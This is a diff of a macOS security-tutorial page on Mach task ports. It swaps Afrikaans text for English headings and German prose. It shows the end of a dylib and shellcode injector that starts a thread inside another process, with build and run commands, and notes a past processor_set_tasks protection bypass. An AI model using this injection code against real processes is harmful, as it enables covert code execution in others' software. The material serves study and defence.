-fprintf(stderr,"Kan nie geheue-toestemmings instel vir die kode van die afgeleë draad nie: Fout %s\n", mach_error_string(kr));
+fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
 return (-4);
 }
 
-// Stel die toestemmings op die toegewysde stokgeheue
+// Set the permissions on the allocated stack memory
 kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
 
 if (kr != KERN_SUCCESS)
 {
-fprintf(stderr,"Kan nie geheue-toestemmings instel vir die stok van die afgeleë draad nie: Fout %s\n", mach_error_string(kr));
+fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
 return (-4);
 }
 
 
-// Skep draad om shellkode uit te voer
+// Create thread to run shellcode
 struct arm_unified_thread_state remoteThreadState64;
 thread_act_t         remoteThread;
 
 memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
 
-remoteStack64 += (STACK_SIZE / 2); // dit is die werklike stok
-//remoteStack64 -= 8;  // nodig uitlyn van 16
+remoteStack64 += (STACK_SIZE / 2); // this is the real stack
+//remoteStack64 -= 8;  // need alignment of 16
 
 const char* p = (const char*) remoteCode64;
 
@@ -1053,13 +1043,13 @@ remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
 remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
 remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
 
-printf ("Afgeleë Stok 64  0x%llx, Afgeleë kode is %p\n", remoteStack64, p );
+printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );
 
 kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
 (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
 
 if (kr != KERN_SUCCESS) {
-fprintf(stderr,"Kan nie afgeleë draad skep nie: fout %s", mach_error_string (kr));
+fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
 return (-3);
 }
 
@@ -1072,8 +1062,8 @@ int main(int argc, const char * argv[])
 {
 if (argc < 3)
 {
-fprintf (stderr, "Gebruik: %s _pid_ _aksie_\n", argv[0]);
-fprintf (stderr, "   _aksie_: pad na 'n dylib op skyf\n");
+fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
+fprintf (stderr, "   _action_: path to a dylib on disk\n");
 exit(0);
 }
 
@@ -1085,62 +1075,64 @@ int rc = stat (action, &buf);
 if (rc == 0) inject(pid,action);
 else
 {
-fprintf(stderr,"Dylib nie gevind nie\n");
+fprintf(stderr,"Dylib not found\n");
 }
 
 }
 ```
-</besonderhede>
+</details>
 ```bash
 gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 ./inject <pid-of-mysleep> </path/to/lib.dylib>
 ```
-### Draadkaping via Taakpoort <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>
+### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>
 
-In hierdie tegniek word 'n draad van die proses gekaap:
+In dieser Technik wird ein Thread des Prozesses übernommen:
 
 {% content-ref url="macos-thread-injection-via-task-port.md" %}
 [macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
 {% endcontent-ref %}
 
-### Taakpoort Inspruiting Opmerking
+### Task Port Injection Detection
 
-Wanneer 'task_for_pid' of 'thread_create_*' geroep word, verhoog dit 'n teller in die `task` struktuur van die kernel wat vanaf gebruikersmodus geroep kan word deur `task_info(task, TASK_EXTMOD_INFO, ...)`.
+Beim Aufruf von `task_for_pid` oder `thread_create_*` wird ein Zähler in der Struktur task aus dem Kernel erhöht, der im Benutzermodus durch den Aufruf von task\_info(task, TASK\_EXTMOD\_INFO, ...) abgerufen werden kann.
 
-## Uitsonderingspoorte
+## Exception Ports
 
-Wanneer 'n uitsondering in 'n draad plaasvind, word hierdie uitsondering gestuur na die aangewese uitsonderingspoort van die draad. As die draad dit nie hanteer nie, word dit na die taakuitsonderingspoorte gestuur. As die taak dit nie hanteer nie, word dit na die gaspoort gestuur wat deur launchd bestuur word (waar dit erken sal word). Dit word uitsonderingstrias genoem.
+Wenn eine Ausnahme in einem Thread auftritt, wird diese Ausnahme an den vorgesehenen Ausnahmeport des Threads gesendet. Wenn der Thread sie nicht behandelt, wird sie an die Ausnahmeports des Tasks gesendet. Wenn der Task sie nicht behandelt, wird sie an den Hostport gesendet, der von launchd verwaltet wird (wo sie anerkannt wird). Dies wird als Ausnahme-Triage bezeichnet.
 
-Let daarop dat gewoonlik as die verslag nie behoorlik hanteer word nie, sal dit uiteindelik deur die ReportCrash daemon hanteer word. Dit is egter moontlik vir 'n ander draad in dieselfde taak om die uitsondering te hanteer, dit is wat krasverslagdoeningshulpmiddels soos `PLCrashReporter` doen.
+Beachten Sie, dass am Ende, wenn sie nicht ordnungsgemäß behandelt wird, der Bericht normalerweise vom ReportCrash-Daemon behandelt wird. Es ist jedoch möglich, dass ein anderer Thread im selben Task die Ausnahme verwaltet, was Tools zur Absturzberichterstattung wie `PLCreashReporter` tun.
 
-## Ander Voorwerpe
+## Other Objects
 
-### Klok
+### Clock
 
-Enige gebruiker kan inligting oor die klok bekom, maar om die tyd in te stel of ander instellings te wysig, moet 'n persoon 'root' wees.
+Jeder Benutzer kann Informationen über die Uhr abrufen, jedoch muss man, um die Zeit einzustellen oder andere Einstellungen zu ändern, Root-Rechte haben.
 
-Om inligting te verkry, is dit moontlik om funksies van die `klok` subsisteem te roep soos: `clock_get_time`, `clock_get_attributtes` of `clock_alarm`. Om waardes te wysig, kan die `clock_priv` subsisteem gebruik word met funksies soos `clock_set_time` en `clock_set_attributes`.
+Um Informationen zu erhalten, ist es möglich, Funktionen aus dem `clock`-Subsystem wie `clock_get_time`, `clock_get_attributtes` oder `clock_alarm` aufzurufen.\
+Um Werte zu ändern, kann das `clock_priv`-Subsystem mit Funktionen wie `clock_set_time` und `clock_set_attributes` verwendet werden.
 
-### Verwerkers en Verwerkerstel
+### Processors and Processor Set
 
-Die verwerker-API's maak dit moontlik om 'n enkele logiese verwerker te beheer deur funksies soos `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`... te roep.
+Die Prozessor-APIs ermöglichen die Steuerung eines einzelnen logischen Prozessors durch den Aufruf von Funktionen wie `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...
 
-Verder bied die **verwerkerstel** API's 'n manier om meerdere verwerkers in 'n groep te groepeer. Dit is moontlik om die verstek verwerkerstel te bekom deur **`processor_set_default`** te roep. Hier is 'n paar interessante API's om met die verwerkerstel te interaksieer:
+Darüber hinaus bietet die **Processor Set**-API eine Möglichkeit, mehrere Prozessoren in einer Gruppe zu gruppieren. Es ist möglich, das Standard-Prozessor-Set durch den Aufruf von **`processor_set_default`** abzurufen.\
+Dies sind einige interessante APIs, um mit dem Prozessor-Set zu interagieren:
 
-- `processor_set_statistics`
-- `processor_set_tasks`: Gee 'n reeks stuurbevoegdhede vir alle take binne die verwerkerstel terug
-- `processor_set_threads`: Gee 'n reeks stuurbevoegdhede vir alle drade binne die verwerkerstel terug
-- `processor_set_stack_usage`
-- `processor_set_info`
+* `processor_set_statistics`
+* `processor_set_tasks`: Gibt ein Array von Senderechten an alle Tasks im Prozessor-Set zurück
+* `processor_set_threads`: Gibt ein Array von Senderechten an alle Threads im Prozessor-Set zurück
+* `processor_set_stack_usage`
+* `processor_set_info`
 
-Soos genoem in [**hierdie pos**](https://reverse.put.as/2014/05/05/about-the-processor\_set\_tasks-access-to-kernel-memory-vulnerability/), het dit in die verlede toegelaat om die vorige genoemde beskerming te omseil om taakpoorte in ander prosesse te bekom om hulle te beheer deur **`processor_set_tasks`** te roep en 'n gaspoort op elke proses te kry.\
-Teenwoordig moet jy 'root' wees om daardie funksie te gebruik en dit is beskerm sodat jy slegs hierdie poorte op onbeskermde prosesse kan kry.
+Wie in [**diesem Beitrag**](https://reverse.put.as/2014/05/05/about-the-processor\_set\_tasks-access-to-kernel-memory-vulnerability/) erwähnt, ermöglichte dies in der Vergangenheit, den zuvor genannten Schutz zu umgehen, um Task-Ports in anderen Prozessen zu erhalten, um sie durch den Aufruf von **`processor_set_tasks`** zu steuern und einen Hostport für jeden Prozess zu erhalten.\
+Heutzutage benötigen Sie Root-Rechte, um diese Funktion zu verwenden, und dies ist geschützt, sodass Sie diese Ports nur in ungeschützten Prozessen erhalten können.
 
-Jy kan dit probeer met:
+Sie können es mit folgendem versuchen:
 
 <details>
 
-<summary><strong>processor_set_tasks kode</strong></summary>
+<summary><strong>processor_set_tasks code</strong></summary>
 ````c
 // Maincpart fo the code from https://newosxbook.com/articles/PST2.html
 //gcc ./port_pid.c -o port_pid
